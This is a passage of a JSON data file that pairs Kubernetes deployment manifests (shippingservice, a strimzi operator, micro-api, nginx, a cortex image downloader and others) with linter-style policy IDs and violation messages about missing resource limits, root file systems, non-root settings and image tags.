    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: shippingservice\nspec:\n  selector:\n    matchLabels:\n      app: shippingservice\n  template:\n    metadata:\n      labels:\n        app: shippingservice\n    spec:\n      containers:\n      - name: server\n        image: shippingservice\n        ports:\n        - containerPort: 50051\n        env:\n        - name: PORT\n          value: '50051'\n        readinessProbe:\n          periodSeconds: 5\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:50051\n        livenessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:50051\n        resources:\n          requests:\n            cpu: 100m\n            memory: 64Mi\n          limits:\n            cpu: 200m\n            memory: 128Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"server\" does not have a read-only root file system"
  },
  {
    "id": "04045",
    "manifest_path": "data/manifests/the_stack_sample/sample_1819.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: shippingservice\nspec:\n  selector:\n    matchLabels:\n      app: shippingservice\n  template:\n    metadata:\n      labels:\n        app: shippingservice\n    spec:\n      containers:\n      - name: server\n        image: shippingservice\n        ports:\n        - containerPort: 50051\n        env:\n        - name: PORT\n          value: '50051'\n        readinessProbe:\n          periodSeconds: 5\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:50051\n        livenessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:50051\n        resources:\n          requests:\n            cpu: 100m\n            memory: 64Mi\n          limits:\n            cpu: 200m\n            memory: 128Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"server\" is not set to runAsNonRoot"
  },
  {
    "id": "04046",
    "manifest_path": "data/manifests/the_stack_sample/sample_1823.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: strimzi-user-operator\n  labels:\n    app: strimzi\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: strimzi-user-operator\n  template:\n    metadata:\n      labels:\n        name: strimzi-user-operator\n    spec:\n      serviceAccountName: strimzi-user-operator\n      containers:\n      - name: strimzi-user-operator\n        image: quay.io/strimzi/operator:0.25.0\n        args:\n        - /opt/strimzi/bin/user_operator_run.sh\n        env:\n        - name: STRIMZI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: STRIMZI_LABELS\n          value: strimzi.io/cluster=my-cluster\n        - name: STRIMZI_CA_CERT_NAME\n          value: my-cluster-clients-ca-cert\n        - name: STRIMZI_CA_KEY_NAME\n          value: my-cluster-clients-ca\n        - name: STRIMZI_FULL_RECONCILIATION_INTERVAL_MS\n          value: '120000'\n        - name: STRIMZI_LOG_LEVEL\n          value: INFO\n        - name: STRIMZI_GC_LOG_ENABLED\n          value: 'true'\n        - name: STRIMZI_CA_VALIDITY\n          value: '365'\n        - name: STRIMZI_CA_RENEWAL\n          value: '30'\n        livenessProbe:\n          httpGet:\n            path: /healthy\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 30\n        readinessProbe:\n          httpGet:\n            path: /ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 30\n        resources:\n          limits:\n            memory: 256Mi\n            cpu: 500m\n          requests:\n            memory: 256Mi\n            cpu: 100m\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"strimzi-user-operator\" does not have a read-only root file system"
  },
  {
    "id": "04047",
    "manifest_path": "data/manifests/the_stack_sample/sample_1823.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: strimzi-user-operator\n  labels:\n    app: strimzi\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: strimzi-user-operator\n  template:\n    metadata:\n      labels:\n        name: strimzi-user-operator\n    spec:\n      serviceAccountName: strimzi-user-operator\n      containers:\n      - name: strimzi-user-operator\n        image: quay.io/strimzi/operator:0.25.0\n        args:\n        - /opt/strimzi/bin/user_operator_run.sh\n        env:\n        - name: STRIMZI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: STRIMZI_LABELS\n          value: strimzi.io/cluster=my-cluster\n        - name: STRIMZI_CA_CERT_NAME\n          value: my-cluster-clients-ca-cert\n        - name: STRIMZI_CA_KEY_NAME\n          value: my-cluster-clients-ca\n        - name: STRIMZI_FULL_RECONCILIATION_INTERVAL_MS\n          value: '120000'\n        - name: STRIMZI_LOG_LEVEL\n          value: INFO\n        - name: STRIMZI_GC_LOG_ENABLED\n          value: 'true'\n        - name: STRIMZI_CA_VALIDITY\n          value: '365'\n        - name: STRIMZI_CA_RENEWAL\n          value: '30'\n        livenessProbe:\n          httpGet:\n            path: /healthy\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 30\n        readinessProbe:\n          httpGet:\n            path: /ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 30\n        resources:\n          limits:\n            memory: 256Mi\n            cpu: 500m\n          requests:\n            memory: 256Mi\n            cpu: 100m\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"strimzi-user-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "04048",
    "manifest_path": "data/manifests/the_stack_sample/sample_1825.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: sistema-noticias-statefulset\nspec:\n  selector:\n    matchLabels:\n      app: sistema-noticias\n  template:\n    metadata:\n      name: sistema-noticias\n      labels:\n        app: sistema-noticias\n    spec:\n      containers:\n      - name: sistema-noticias\n        image: aluracursos/sistema-noticias:1\n        ports:\n        - containerPort: 80\n        envFrom:\n        - configMapRef:\n            name: sistema-noticias-config-map\n        volumeMounts:\n        - mountPath: /var/www/html/uploads\n          name: imagens-pvc\n        - mountPath: /tmp\n          name: sessao-pvc\n      volumes:\n      - name: imagens-pvc\n        persistentVolumeClaim:\n          claimName: imagens-pvc\n      - name: sessao-pvc\n        persistentVolumeClaim:\n          claimName: sessao-pvc\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sistema-noticias\" does not have a read-only root file system"
  },
  {
    "id": "04049",
    "manifest_path": "data/manifests/the_stack_sample/sample_1825.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: sistema-noticias-statefulset\nspec:\n  selector:\n    matchLabels:\n      app: sistema-noticias\n  template:\n    metadata:\n      name: sistema-noticias\n      labels:\n        app: sistema-noticias\n    spec:\n      containers:\n      - name: sistema-noticias\n        image: aluracursos/sistema-noticias:1\n        ports:\n        - containerPort: 80\n        envFrom:\n        - configMapRef:\n            name: sistema-noticias-config-map\n        volumeMounts:\n        - mountPath: /var/www/html/uploads\n          name: imagens-pvc\n        - mountPath: /tmp\n          name: sessao-pvc\n      volumes:\n      - name: imagens-pvc\n        persistentVolumeClaim:\n          claimName: imagens-pvc\n      - name: sessao-pvc\n        persistentVolumeClaim:\n          claimName: sessao-pvc\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sistema-noticias\" is not set to runAsNonRoot"
  },
  {
    "id": "04050",
    "manifest_path": "data/manifests/the_stack_sample/sample_1825.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: sistema-noticias-statefulset\nspec:\n  selector:\n    matchLabels:\n      app: sistema-noticias\n  template:\n    metadata:\n      name: sistema-noticias\n      labels:\n        app: sistema-noticias\n    spec:\n      containers:\n      - name: sistema-noticias\n        image: aluracursos/sistema-noticias:1\n        ports:\n        - containerPort: 80\n        envFrom:\n        - configMapRef:\n            name: sistema-noticias-config-map\n        volumeMounts:\n        - mountPath: /var/www/html/uploads\n          name: imagens-pvc\n        - mountPath: /tmp\n          name: sessao-pvc\n      volumes:\n      - name: imagens-pvc\n        persistentVolumeClaim:\n          claimName: imagens-pvc\n      - name: sessao-pvc\n        persistentVolumeClaim:\n          claimName: sessao-pvc\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"sistema-noticias\" has cpu request 0"
  },
  {
    "id": "04051",
    "manifest_path": "data/manifests/the_stack_sample/sample_1825.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: sistema-noticias-statefulset\nspec:\n  selector:\n    matchLabels:\n      app: sistema-noticias\n  template:\n    metadata:\n      name: sistema-noticias\n      labels:\n        app: sistema-noticias\n    spec:\n      containers:\n      - name: sistema-noticias\n        image: aluracursos/sistema-noticias:1\n        ports:\n        - containerPort: 80\n        envFrom:\n        - configMapRef:\n            name: sistema-noticias-config-map\n        volumeMounts:\n        - mountPath: /var/www/html/uploads\n          name: imagens-pvc\n        - mountPath: /tmp\n          name: sessao-pvc\n      volumes:\n      - name: imagens-pvc\n        persistentVolumeClaim:\n          claimName: imagens-pvc\n      - name: sessao-pvc\n        persistentVolumeClaim:\n          claimName: sessao-pvc\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"sistema-noticias\" has memory limit 0"
  },
  {
    "id": "04052",
    "manifest_path": "data/manifests/the_stack_sample/sample_1831.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: micro-api\n  labels:\n    micro: runtime\n    name: micro-api\n  annotations:\n    name: go.micro.api\n    version: latest\n    source: github.com/xinhari/hari\n    owner: micro\n    group: micro\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      name: micro-api\n      micro: runtime\n  template:\n    metadata:\n      labels:\n        name: micro-api\n        micro: runtime\n    spec:\n      containers:\n      - name: api\n        env:\n        - name: MICRO_AUTH\n          value: service\n        - name: MICRO_AUTH_PUBLIC_KEY\n          valueFrom:\n            secretKeyRef:\n              name: micro-keypair\n              key: public\n        - name: MICRO_API_NAMESPACE\n          value: domain\n        - name: MICRO_ENABLE_STATS\n          value: 'true'\n        - name: MICRO_BROKER\n          value: nats\n        - name: MICRO_BROKER_ADDRESS\n          value: nats-cluster\n        - name: MICRO_REGISTRY\n          value: etcd\n        - name: MICRO_REGISTRY_ADDRESS\n          value: etcd-cluster-client\n        - name: MICRO_REGISTER_TTL\n          value: '60'\n        - name: MICRO_REGISTER_INTERVAL\n          value: '30'\n        - name: MICRO_ENABLE_ACME\n          value: 'true'\n        - name: MICRO_ACME_PROVIDER\n          value: certmagic\n        - name: MICRO_ACME_HOSTS\n          value: '*.micro.mu,*.cloud.micro.mu,micro.mu'\n        - name: MICRO_STORE\n          value: service\n        - name: MICRO_STORE_DATABASE\n          value: micro\n        - name: MICRO_STORE_TABLE\n          value: micro\n        - name: CF_API_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: CF_API_TOKEN\n              name: cloudflare-credentials\n        args:\n        - api\n        image: agus7fauzi/hari\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 443\n          name: api-port\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"api\" is using an invalid container image, \"agus7fauzi/hari\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "04053",
    "manifest_path": "data/manifests/the_stack_sample/sample_1831.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: micro-api\n  labels:\n    micro: runtime\n    name: micro-api\n  annotations:\n    name: go.micro.api\n    version: latest\n    source: github.com/xinhari/hari\n    owner: micro\n    group: micro\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      name: micro-api\n      micro: runtime\n  template:\n    metadata:\n      labels:\n        name: micro-api\n        micro: runtime\n    spec:\n      containers:\n      - name: api\n        env:\n        - name: MICRO_AUTH\n          value: service\n        - name: MICRO_AUTH_PUBLIC_KEY\n          valueFrom:\n            secretKeyRef:\n              name: micro-keypair\n              key: public\n        - name: MICRO_API_NAMESPACE\n          value: domain\n        - name: MICRO_ENABLE_STATS\n          value: 'true'\n        - name: MICRO_BROKER\n          value: nats\n        - name: MICRO_BROKER_ADDRESS\n          value: nats-cluster\n        - name: MICRO_REGISTRY\n          value: etcd\n        - name: MICRO_REGISTRY_ADDRESS\n          value: etcd-cluster-client\n        - name: MICRO_REGISTER_TTL\n          value: '60'\n        - name: MICRO_REGISTER_INTERVAL\n          value: '30'\n        - name: MICRO_ENABLE_ACME\n          value: 'true'\n        - name: MICRO_ACME_PROVIDER\n          value: certmagic\n        - name: MICRO_ACME_HOSTS\n          value: '*.micro.mu,*.cloud.micro.mu,micro.mu'\n        - name: MICRO_STORE\n          value: service\n        - name: MICRO_STORE_DATABASE\n          value: micro\n        - name: MICRO_STORE_TABLE\n          value: micro\n        - name: CF_API_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: CF_API_TOKEN\n              name: cloudflare-credentials\n        args:\n        - api\n        image: agus7fauzi/hari\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 443\n          name: api-port\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"api\" does not have a read-only root file system"
  },
  {
    "id": "04054",
    "manifest_path": "data/manifests/the_stack_sample/sample_1831.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: micro-api\n  labels:\n    micro: runtime\n    name: micro-api\n  annotations:\n    name: go.micro.api\n    version: latest\n    source: github.com/xinhari/hari\n    owner: micro\n    group: micro\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      name: micro-api\n      micro: runtime\n  template:\n    metadata:\n      labels:\n        name: micro-api\n        micro: runtime\n    spec:\n      containers:\n      - name: api\n        env:\n        - name: MICRO_AUTH\n          value: service\n        - name: MICRO_AUTH_PUBLIC_KEY\n          valueFrom:\n            secretKeyRef:\n              name: micro-keypair\n              key: public\n        - name: MICRO_API_NAMESPACE\n          value: domain\n        - name: MICRO_ENABLE_STATS\n          value: 'true'\n        - name: MICRO_BROKER\n          value: nats\n        - name: MICRO_BROKER_ADDRESS\n          value: nats-cluster\n        - name: MICRO_REGISTRY\n          value: etcd\n        - name: MICRO_REGISTRY_ADDRESS\n          value: etcd-cluster-client\n        - name: MICRO_REGISTER_TTL\n          value: '60'\n        - name: MICRO_REGISTER_INTERVAL\n          value: '30'\n        - name: MICRO_ENABLE_ACME\n          value: 'true'\n        - name: MICRO_ACME_PROVIDER\n          value: certmagic\n        - name: MICRO_ACME_HOSTS\n          value: '*.micro.mu,*.cloud.micro.mu,micro.mu'\n        - name: MICRO_STORE\n          value: service\n        - name: MICRO_STORE_DATABASE\n          value: micro\n        - name: MICRO_STORE_TABLE\n          value: micro\n        - name: CF_API_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: CF_API_TOKEN\n              name: cloudflare-credentials\n        args:\n        - api\n        image: agus7fauzi/hari\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 443\n          name: api-port\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"api\" is not set to runAsNonRoot"
  },
  {
    "id": "04055",
    "manifest_path": "data/manifests/the_stack_sample/sample_1831.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: micro-api\n  labels:\n    micro: runtime\n    name: micro-api\n  annotations:\n    name: go.micro.api\n    version: latest\n    source: github.com/xinhari/hari\n    owner: micro\n    group: micro\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      name: micro-api\n      micro: runtime\n  template:\n    metadata:\n      labels:\n        name: micro-api\n        micro: runtime\n    spec:\n      containers:\n      - name: api\n        env:\n        - name: MICRO_AUTH\n          value: service\n        - name: MICRO_AUTH_PUBLIC_KEY\n          valueFrom:\n            secretKeyRef:\n              name: micro-keypair\n              key: public\n        - name: MICRO_API_NAMESPACE\n          value: domain\n        - name: MICRO_ENABLE_STATS\n          value: 'true'\n        - name: MICRO_BROKER\n          value: nats\n        - name: MICRO_BROKER_ADDRESS\n          value: nats-cluster\n        - name: MICRO_REGISTRY\n          value: etcd\n        - name: MICRO_REGISTRY_ADDRESS\n          value: etcd-cluster-client\n        - name: MICRO_REGISTER_TTL\n          value: '60'\n        - name: MICRO_REGISTER_INTERVAL\n          value: '30'\n        - name: MICRO_ENABLE_ACME\n          value: 'true'\n        - name: MICRO_ACME_PROVIDER\n          value: certmagic\n        - name: MICRO_ACME_HOSTS\n          value: '*.micro.mu,*.cloud.micro.mu,micro.mu'\n        - name: MICRO_STORE\n          value: service\n        - name: MICRO_STORE_DATABASE\n          value: micro\n        - name: MICRO_STORE_TABLE\n          value: micro\n        - name: CF_API_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: CF_API_TOKEN\n              name: cloudflare-credentials\n        args:\n        - api\n        image: agus7fauzi/hari\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 443\n          name: api-port\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"api\" has cpu request 0"
  },
  {
    "id": "04056",
    "manifest_path": "data/manifests/the_stack_sample/sample_1831.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: micro-api\n  labels:\n    micro: runtime\n    name: micro-api\n  annotations:\n    name: go.micro.api\n    version: latest\n    source: github.com/xinhari/hari\n    owner: micro\n    group: micro\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      name: micro-api\n      micro: runtime\n  template:\n    metadata:\n      labels:\n        name: micro-api\n        micro: runtime\n    spec:\n      containers:\n      - name: api\n        env:\n        - name: MICRO_AUTH\n          value: service\n        - name: MICRO_AUTH_PUBLIC_KEY\n          valueFrom:\n            secretKeyRef:\n              name: micro-keypair\n              key: public\n        - name: MICRO_API_NAMESPACE\n          value: domain\n        - name: MICRO_ENABLE_STATS\n          value: 'true'\n        - name: MICRO_BROKER\n          value: nats\n        - name: MICRO_BROKER_ADDRESS\n          value: nats-cluster\n        - name: MICRO_REGISTRY\n          value: etcd\n        - name: MICRO_REGISTRY_ADDRESS\n          value: etcd-cluster-client\n        - name: MICRO_REGISTER_TTL\n          value: '60'\n        - name: MICRO_REGISTER_INTERVAL\n          value: '30'\n        - name: MICRO_ENABLE_ACME\n          value: 'true'\n        - name: MICRO_ACME_PROVIDER\n          value: certmagic\n        - name: MICRO_ACME_HOSTS\n          value: '*.micro.mu,*.cloud.micro.mu,micro.mu'\n        - name: MICRO_STORE\n          value: service\n        - name: MICRO_STORE_DATABASE\n          value: micro\n        - name: MICRO_STORE_TABLE\n          value: micro\n        - name: CF_API_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: CF_API_TOKEN\n              name: cloudflare-credentials\n        args:\n        - api\n        image: agus7fauzi/hari\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 443\n          name: api-port\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"api\" has memory limit 0"
  },
  {
    "id": "04057",
    "manifest_path": "data/manifests/the_stack_sample/sample_1835.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app-a1\n  namespace: test-kahoy\n  labels:\n    app: app-a1\n  annotations:\n    app: app-a1\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: app-a1\n  template:\n    metadata:\n      labels:\n        app: app-a1\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:latest\n        ports:\n        - name: http\n          containerPort: 80\n          protocol: TCP\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "04058",
    "manifest_path": "data/manifests/the_stack_sample/sample_1835.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app-a1\n  namespace: test-kahoy\n  labels:\n    app: app-a1\n  annotations:\n    app: app-a1\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: app-a1\n  template:\n    metadata:\n      labels:\n        app: app-a1\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:latest\n        ports:\n        - name: http\n          containerPort: 80\n          protocol: TCP\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "04059",
    "manifest_path": "data/manifests/the_stack_sample/sample_1835.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app-a1\n  namespace: test-kahoy\n  labels:\n    app: app-a1\n  annotations:\n    app: app-a1\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: app-a1\n  template:\n    metadata:\n      labels:\n        app: app-a1\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:latest\n        ports:\n        - name: http\n          containerPort: 80\n          protocol: TCP\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "04060",
    "manifest_path": "data/manifests/the_stack_sample/sample_1835.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app-a1\n  namespace: test-kahoy\n  labels:\n    app: app-a1\n  annotations:\n    app: app-a1\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: app-a1\n  template:\n    metadata:\n      labels:\n        app: app-a1\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:latest\n        ports:\n        - name: http\n          containerPort: 80\n          protocol: TCP\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "04061",
    "manifest_path": "data/manifests/the_stack_sample/sample_1835.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app-a1\n  namespace: test-kahoy\n  labels:\n    app: app-a1\n  annotations:\n    app: app-a1\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: app-a1\n  template:\n    metadata:\n      labels:\n        app: app-a1\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:latest\n        ports:\n        - name: http\n          containerPort: 80\n          protocol: TCP\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "04062",
    "manifest_path": "data/manifests/the_stack_sample/sample_1838.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: image-downloader\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      name: image-downloader\n  template:\n    metadata:\n      labels:\n        name: image-downloader\n    spec:\n      containers:\n      - name: python-predictor-cpu\n        image: $CORTEX_IMAGE_PYTHON_PREDICTOR_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-serving-cpu\n        image: $CORTEX_IMAGE_TENSORFLOW_SERVING_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-predictor\n        image: $CORTEX_IMAGE_TENSORFLOW_PREDICTOR\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: downloader\n        image: $CORTEX_IMAGE_DOWNLOADER\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"downloader\" is using an invalid container image, \"$CORTEX_IMAGE_DOWNLOADER\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "04063",
    "manifest_path": "data/manifests/the_stack_sample/sample_1838.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: image-downloader\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      name: image-downloader\n  template:\n    metadata:\n      labels:\n        name: image-downloader\n    spec:\n      containers:\n      - name: python-predictor-cpu\n        image: $CORTEX_IMAGE_PYTHON_PREDICTOR_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-serving-cpu\n        image: $CORTEX_IMAGE_TENSORFLOW_SERVING_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-predictor\n        image: $CORTEX_IMAGE_TENSORFLOW_PREDICTOR\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: downloader\n        image: $CORTEX_IMAGE_DOWNLOADER\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"python-predictor-cpu\" is using an invalid container image, \"$CORTEX_IMAGE_PYTHON_PREDICTOR_CPU\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "04064",
    "manifest_path": "data/manifests/the_stack_sample/sample_1838.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: image-downloader\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      name: image-downloader\n  template:\n    metadata:\n      labels:\n        name: image-downloader\n    spec:\n      containers:\n      - name: python-predictor-cpu\n        image: $CORTEX_IMAGE_PYTHON_PREDICTOR_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-serving-cpu\n        image: $CORTEX_IMAGE_TENSORFLOW_SERVING_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-predictor\n        image: $CORTEX_IMAGE_TENSORFLOW_PREDICTOR\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: downloader\n        image: $CORTEX_IMAGE_DOWNLOADER\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"tensorflow-predictor\" is using an invalid container image, \"$CORTEX_IMAGE_TENSORFLOW_PREDICTOR\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "04065",
    "manifest_path": "data/manifests/the_stack_sample/sample_1838.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: image-downloader\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      name: image-downloader\n  template:\n    metadata:\n      labels:\n        name: image-downloader\n    spec:\n      containers:\n      - name: python-predictor-cpu\n        image: $CORTEX_IMAGE_PYTHON_PREDICTOR_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-serving-cpu\n        image: $CORTEX_IMAGE_TENSORFLOW_SERVING_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-predictor\n        image: $CORTEX_IMAGE_TENSORFLOW_PREDICTOR\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: downloader\n        image: $CORTEX_IMAGE_DOWNLOADER\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"tensorflow-serving-cpu\" is using an invalid container image, \"$CORTEX_IMAGE_TENSORFLOW_SERVING_CPU\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "04066",
    "manifest_path": "data/manifests/the_stack_sample/sample_1838.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: image-downloader\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      name: image-downloader\n  template:\n    metadata:\n      labels:\n        name: image-downloader\n    spec:\n      containers:\n      - name: python-predictor-cpu\n        image: $CORTEX_IMAGE_PYTHON_PREDICTOR_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-serving-cpu\n        image: $CORTEX_IMAGE_TENSORFLOW_SERVING_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-predictor\n        image: $CORTEX_IMAGE_TENSORFLOW_PREDICTOR\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: downloader\n        image: $CORTEX_IMAGE_DOWNLOADER\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"downloader\" does not have a read-only root file system"
  },
  {
    "id": "04067",
    "manifest_path": "data/manifests/the_stack_sample/sample_1838.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: image-downloader\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      name: image-downloader\n  template:\n    metadata:\n      labels:\n        name: image-downloader\n    spec:\n      containers:\n      - name: python-predictor-cpu\n        image: $CORTEX_IMAGE_PYTHON_PREDICTOR_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-serving-cpu\n        image: $CORTEX_IMAGE_TENSORFLOW_SERVING_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-predictor\n        image: $CORTEX_IMAGE_TENSORFLOW_PREDICTOR\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: downloader\n        image: $CORTEX_IMAGE_DOWNLOADER\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"python-predictor-cpu\" does not have a read-only root file system"
  },
  {
    "id": "04068",
    "manifest_path": "data/manifests/the_stack_sample/sample_1838.yaml",
